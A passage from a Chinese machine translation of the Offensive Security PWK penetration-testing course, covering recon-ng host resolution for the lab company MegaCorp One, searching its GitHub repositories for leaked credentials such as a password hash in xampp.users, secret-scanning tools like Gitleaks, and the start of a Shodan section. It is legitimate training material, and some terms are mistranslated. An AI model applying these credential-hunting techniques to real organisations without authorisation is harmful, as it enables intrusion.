<div style="position:absolute;top:181740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] siem.megacorpone.com =&gt; 38.100.193.89</font></font></nobr></div>
<div style="position:absolute;top:181759;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 207 - 运行 recon/hosts-hosts/resolve</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:181789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font><font style="vertical-align: inherit;">我们现在有四个域的 IP 地址。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:181939;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="154"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 154 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:181972;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:183049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:183049;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:183049;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">154</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:182068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们</font><font style="vertical-align: inherit;">再次</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示主机</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以验证数据库是否已使用两者的结果进行更新</font></font></nobr></div>
<div style="position:absolute;top:182087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:182122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default][resolve] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示主机</font></font></font></b></nobr></div>
<div style="position:absolute;top:182156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- ----------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:182173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">行号 |    </font></font></nobr></div>
<div style="position:absolute;top:182173;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></nobr></div>
<div style="position:absolute;top:182173;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">ip_address | </font><font style="vertical-align: inherit;">地区| </font><font style="vertical-align: inherit;">国家 | </font><font style="vertical-align: inherit;">模块 |</font></font></nobr></div>
<div style="position:absolute;top:182190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- ----------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:182207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1 | </font><font style="vertical-align: inherit;">www.megacorpone.com | </font><font style="vertical-align: inherit;">38.100.193.76 |    </font></font></nobr></div>
<div style="position:absolute;top:182207;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:182207;left:643"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:182224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2 | </font><font style="vertical-align: inherit;">vpn.megacorpone.com | </font><font style="vertical-align: inherit;">38.100.193.77 |    </font></font></nobr></div>
<div style="position:absolute;top:182224;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:182224;left:643"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:182241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">3 | </font><font style="vertical-align: inherit;">www2.megacorpone.com | </font><font style="vertical-align: inherit;">38.100.193.79 |    </font></font></nobr></div>
<div style="position:absolute;top:182241;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:182241;left:643"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:182258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">4 | </font><font style="vertical-align: inherit;">siem.megacorpone.com | </font><font style="vertical-align: inherit;">38.100.193.89 |    </font></font></nobr></div>
<div style="position:absolute;top:182258;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:182258;left:643"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:182275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- ----------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:182309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 4 行返回</font></font></nobr></div>
<div style="position:absolute;top:182328;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 208 - 在多个模块之后显示主机</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:182359;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.6.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:182394;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（此练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:182426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 recon/domains-hosts/google_site_web 和 recon/hosts-hosts/resolve 模块</font></font></nobr></div>
<div style="position:absolute;top:182446;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集有关 MegaCorp One 的信息。</font></font></nobr></div>
<div style="position:absolute;top:182474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 花一些时间探索其他侦察模块。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:182511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.7 开源代码</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:182553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在以下各节中，我们将讨论可用于以下各项的各种在线工具和资源</font></font></nobr></div>
<div style="position:absolute;top:182572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被动搜索信息。</font><font style="vertical-align: inherit;">一种有趣的信息来源是开源</font></font></nobr></div>
<div style="position:absolute;top:182592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">项目和在线代码存储库，例如 GitHub、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">153</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> GitLab、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">154</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 SourceForge。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">155</font></font></font></nobr></div>
<div style="position:absolute;top:182624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线存储的代码可以让您一瞥所使用的编程语言和框架</font></font></nobr></div>
<div style="position:absolute;top:182644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由一个组织。</font><font style="vertical-align: inherit;">在一些罕见的情况下，开发人员甚至不小心犯了敏感</font></font></nobr></div>
<div style="position:absolute;top:182663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共存储库的数据和凭据。</font></font></nobr></div>
<div style="position:absolute;top:182696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中一些平台的搜索工具将支持我们使用的 Google 搜索运算符</font></font></nobr></div>
<div style="position:absolute;top:182715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块前面讨论过。</font></font></nobr></div>
<div style="position:absolute;top:182748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，GitHub 的搜索</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">156</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常灵活。</font><font style="vertical-align: inherit;">在 GitHub 上，我们将能够搜索用户的或</font></font></nobr></div>
<div style="position:absolute;top:182768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织的存储库，但如果我们想搜索所有公共存储库，我们需要一个帐户。</font></font></nobr></div>
<div style="position:absolute;top:182800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在之前的模块中，我们确定了 MegaCorp One 的 GitHub 帐户。</font></font></nobr></div>
<div style="position:absolute;top:182833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们在该帐户的存储库中搜索有趣的信息。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">filename:users</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来</font></font></nobr></div>
<div style="position:absolute;top:182853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索名称中包含“users”一词的任何文件：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:182939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">153 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GitHub，2019 年），https://github.com/</font></font></font></nobr></div>
<div style="position:absolute;top:182959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">154 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(GitLab, 2019), https://about.gitlab.com/</font></font></font></nobr></div>
<div style="position:absolute;top:182979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">155 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Slashdot 媒体，2019 年），https://sourceforge.net/</font></font></font></nobr></div>
<div style="position:absolute;top:182999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">156 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GitHub，2019），https://help.github.com/en/github/searching-for-information-on-github/searching-code</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:183127;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="155"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 155 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:183160;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:184237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:184237;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:184237;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">155</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:183720;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 30：GitHub 搜索中的文件运算符</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:183751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的搜索只找到了一个文件 - xampp.users。</font><font style="vertical-align: inherit;">即使只有一个结果，我们也可能发现</font></font></nobr></div>
<div style="position:absolute;top:183770;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XAMPP </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">157</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个</font><font style="vertical-align: inherit;">非常有趣</font><font style="vertical-align: inherit;">的 Web 应用程序开发环境。</font><font style="vertical-align: inherit;">让我们</font></font></nobr></div>
<div style="position:absolute;top:183790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查文件的内容。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:184187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">157 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Apache Friends，2019），https://www.apachefriends.org/index.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:184315;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="156"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 156 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:184348;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:185425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:185425;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:185425;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">156</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:184909;left:365"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 31：GitHub 搜索结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:184940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个文件似乎包含一个用户名和密码哈希</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">158</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，当我们</font></font></nobr></div>
<div style="position:absolute;top:184959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始我们的主动攻击阶段。</font><font style="vertical-align: inherit;">让我们将其添加到我们的笔记中。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:185375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">158 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Cryptographic_hash_function#Password_verification</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:185503;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="157"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 157 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:185536;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:186613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:186613;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:186613;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">157</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186097;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 32：xampp.users 文件内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种手动方法最适合小型存储库。</font><font style="vertical-align: inherit;">对于较大的 repos，我们可以使用多种工具来</font></font></nobr></div>
<div style="position:absolute;top:186147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助自动化一些搜索，例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gitrob </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">159</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gitleaks</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">160</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Recon-ng 也有几个</font></font></nobr></div>
<div style="position:absolute;top:186166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于搜索 GitHub 的模块。</font><font style="vertical-align: inherit;">大多数这些工具需要访问令牌</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">161</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">才能使用源</font></font></nobr></div>
<div style="position:absolute;top:186186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码托管提供商的 API。</font></font></nobr></div>
<div style="position:absolute;top:186219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，下面的截图显示Gitleaks的找到一个示例</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AWS客户端ID </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">162</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中</font></font></nobr></div>
<div style="position:absolute;top:186238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一份文件：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:186489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">159 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（迈克尔·亨里克森，2018 年），https://github.com/michenriksen/gitrob</font></font></font></nobr></div>
<div style="position:absolute;top:186509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">160 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（扎卡里赖斯，2019 年），https://github.com/zricethezav/gitleaks</font></font></font></nobr></div>
<div style="position:absolute;top:186529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">161 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GitHub，2019），https://help.github.com/en/articles/creating-a-personal-access-token-for-the-command-line</font></font></font></nobr></div>
<div style="position:absolute;top:186549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">162 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（亚马逊网络服务，2019 年），https://docs.aws.amazon.com/general/latest/gr/aws-sec-cred-types.html#access-keys-and-secret-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:186564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问键 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:186691;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="158"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 158 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:186724;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:187801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:187801;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:187801;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">158</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187135;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 33：Gitleaks 输出示例</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187193;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过源代码搜索秘密的工具，如 Gitrob 或 Gitleaks，</font></font></i></nobr></div>
<div style="position:absolute;top:187213;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常依靠正则表达式</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">163</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font><font style="vertical-align: inherit;">基于</font><font style="vertical-align: inherit;">熵</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">164</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的检测来识别</font></font></i></nobr></div>
<div style="position:absolute;top:187232;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">潜在有用的信息。</font><font style="vertical-align: inherit;">正则表达式是预定义的搜索</font></font></i></nobr></div>
<div style="position:absolute;top:187251;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图案。</font><font style="vertical-align: inherit;">它们对于搜索文本正文特别有用</font></font></i></nobr></div>
<div style="position:absolute;top:187271;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常用密码的变体。</font><font style="vertical-align: inherit;">另一方面，基于熵的检测</font></font></i></nobr></div>
<div style="position:absolute;top:187290;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手，试图找到随机生成的字符串。</font><font style="vertical-align: inherit;">这里的想法是</font></font></i></nobr></div>
<div style="position:absolute;top:187309;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一长串随机字符和数字可能是密码。</font></font></i></nobr></div>
<div style="position:absolute;top:187328;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论工具如何搜索秘密，没有任何工具是完美的，它们会</font></font></i></nobr></div>
<div style="position:absolute;top:187348;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错过人工检查可能会发现的东西。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187410;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.7.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在 Megacorpone 的 GitHub 存储库中搜索有趣或敏感的信息。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.8 初丹</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们收集有关目标的信息时，重要的是要记住传统网站是</font></font></nobr></div>
<div style="position:absolute;top:187539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只是互联网的一部分。</font></font></nobr></div>
<div style="position:absolute;top:187571;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shodan </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">165</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个搜索引擎，可以抓取连接到 Internet 的设备，包括但不限于</font></font></nobr></div>
<div style="position:absolute;top:187591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到万维网。</font><font style="vertical-align: inherit;">这包括运行网站的服务器以及路由器等设备</font></font></nobr></div>
<div style="position:absolute;top:187610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 IoT </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">166</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设备。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:187691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">163 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Regular_expression</font></font></font></nobr></div>
<div style="position:absolute;top:187711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">164 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Password_strength#Random_passwords</font></font></font></nobr></div>
<div style="position:absolute;top:187731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">165 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Shodan，2019 年），https://www.shodan.io/</font></font></font></nobr></div>
<div style="position:absolute;top:187751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">166 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Internet_of_things</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:187879;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="159"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 159 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:187912;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:188989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:188989;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:188989;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">159</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">换句话说，谷歌和其他搜索引擎寻找网络服务器内容，而 Shodan</font></font></nobr></div>
